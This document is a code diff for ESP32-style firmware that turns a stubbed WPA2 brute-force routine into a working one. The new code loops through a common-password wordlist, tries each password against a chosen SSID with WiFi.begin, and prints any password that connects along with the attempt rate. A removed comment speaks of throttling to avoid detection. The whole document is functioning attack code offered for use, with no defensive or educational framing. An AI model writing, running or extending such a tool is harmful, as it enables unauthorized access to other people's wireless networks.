@@ -1,4 +1,5 @@
 #include "wifi_bruteforce.h"
+#include <WiFi.h>
 #include <vector>
 
 namespace WiFiBruteforce {
@@ -24,13 +25,15 @@ BruteResult bruteForce(const String &targetSSID, uint16_t timeoutMs) {
     unsigned long startTime = millis();
     std::vector<String> wordlist = getCommonPasswordList();
 
-    Serial.println("\n=== WiFi WPA2 Brute-Force ===");
+    Serial.println("\n=== WiFi WPA2 Brute-Force (REAL) ===");
     Serial.println("Target SSID: " + targetSSID);
     Serial.println("Wordlist size: " + String(wordlist.size()));
-    Serial.println("Starting brute-force...\n");
+    Serial.println("Timeout: " + String(timeoutMs) + "ms");
+    Serial.println("Starting real WiFi connection attempts...\n");
 
-    // Stub: In production would attempt WiFi connection for each password
-    // With throttling between attempts to avoid detection/rate-limiting
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect(true);
+    delay(100);
 
     for (size_t i = 0; i < wordlist.size(); i++) {
         if (millis() - startTime > timeoutMs) {
@@ -39,33 +42,49 @@ BruteResult bruteForce(const String &targetSSID, uint16_t timeoutMs) {
         }
 
         result.attemptsCount++;
+        const char* password = wordlist[i].c_str();
 
-        // Simulate some attempts
-        if (i % 10 == 0) {
-            Serial.println("Attempt " + String(result.attemptsCount) + ": " + wordlist[i]);
+        Serial.printf("[%u/%u] Trying: %s\n",
+                     result.attemptsCount, wordlist.size(), password);
+
+        WiFi.begin(targetSSID.c_str(), password);
+
+        uint32_t connStart = millis();
+        wl_status_t status = WL_IDLE_STATUS;
+
+        while ((millis() - connStart) < 5000 && status != WL_CONNECTED) {
+            status = WiFi.status();
+
+            if (status == WL_CONNECT_FAILED || status == WL_NO_SSID_AVAIL) {
+                break;
+            }
+
+            delay(100);
         }
 
-        delay(50);  // Throttle to avoid spam
+        if (WiFi.isConnected()) {
+            result.passwordFound = true;
+            result.foundPassword = wordlist[i];
+            Serial.printf("\n✓ PASSWORD FOUND: %s\n", password);
+            Serial.printf("RSSI: %d dBm\n", WiFi.RSSI());
+            WiFi.disconnect(true);
+            break;
+        }
 
-        // In production: Try to connect with this password
-        // if (WiFi.begin(targetSSID.c_str(), wordlist[i].c_str()) == WL_CONNECTED) {
-        //     result.passwordFound = true;
-        //     result.foundPassword = wordlist[i];
-        //     break;
-        // }
+        WiFi.disconnect(true);
+        delay(500);
     }
 
     result.durationMs = millis() - startTime;
 
-    if (result.passwordFound) {
-        Serial.println("\n✓ PASSWORD FOUND: " + result.foundPassword);
-    } else {
+    if (!result.passwordFound) {
         Serial.println("\n✗ Password not found in wordlist");
         result.error = "Password not in wordlist";
     }
 
-    Serial.println("Attempts: " + String(result.attemptsCount));
-    Serial.println("Duration: " + String(result.durationMs) + "ms\n");
+    Serial.printf("Attempts: %u | Duration: %lums | Rate: %.1f attempts/sec\n",
+                 result.attemptsCount, result.durationMs,
+                 (result.attemptsCount * 1000.0f) / result.durationMs);
 
     return result;
 }
